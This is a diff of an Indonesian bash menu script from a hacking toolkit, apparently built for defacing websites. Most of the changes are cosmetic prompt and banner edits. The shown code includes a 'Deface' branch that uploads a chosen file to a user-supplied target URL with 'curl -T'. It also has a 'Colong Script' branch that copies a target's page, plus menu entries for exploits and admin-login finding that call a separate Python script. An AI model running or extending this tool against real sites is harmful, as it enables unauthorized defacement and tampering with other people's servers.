@@ -19,8 +19,8 @@ echo $cyan" ["$red"+"$cyan"]Blog        : http://generasicyberindo.blogspot.com"
 echo $cyan" ["$red"+"$cyan"]Github	: https://github.com/21D4N404"
 echo $cyan" ["$white"NOTE : simpan script di memory internal di luar folder  "$cyan"]"
 echo $purple"___________________________________________________"
-echo $red"	~"$cyan"{"$white"A"$cyan"}"$white".Tebas Index"$cyan"		{"$white"Q"$cyan"}"$white"Quit "
-echo $red"	~"$cyan"{"$white"B"$cyan"}"$white".Colong SC"$cyan"		{"$white"I"$cyan"}"$white"Info "
+echo $red"	~"$cyan"{"$white"A"$cyan"}"$white".Tebas Index"$cyan"    {"$white"Q"$cyan"}"$white"Quit "
+echo $red"	~"$cyan"{"$white"B"$cyan"}"$white".Colong Script"$cyan"		{"$white"I"$cyan"}"$white"Info "
 echo $red"	~"$cyan"{"$white"C"$cyan"}"$white".Exploit"$cyan
 echo $red"	~"$cyan"{"$white"D"$cyan"}"$white".AdminLogin"$cyan
 echo $purple"___________________________________________________"
@@ -34,14 +34,14 @@ then
  
 echo "                                          "
 figlet -f future Deface
-echo $green "Masukan Target !!!! "
+echo $red "Masukan Target !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
 read -p " ╰─$ "  target
 echo $green "Masukan Script !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Hajar"$white
 read -p " ╰─$ "  script
 curl -T /storage/emulated/0/$script $target
-echo $red "[+]>>>>> = $target/$script "
+echo $red "[+]>>>>> = $target/$script"
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
 read -p "[B/Q] : " back
 fi
@@ -55,7 +55,7 @@ echo $green "Masukan Target !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
 read -p " ╰─$ "  target
 echo $green "Simpan dengan nama??(ex: script.html)"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Colong"$white
 read -p " ╰─$ " simpan
 curl -o $simpan $target
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
@@ -177,7 +177,7 @@ fi
 
 if [ $apaan = "D" ] || [ $apaan = "d" ]
 then
-python2 AMR.py
+python2 zrd.py
 exit
 fi
 
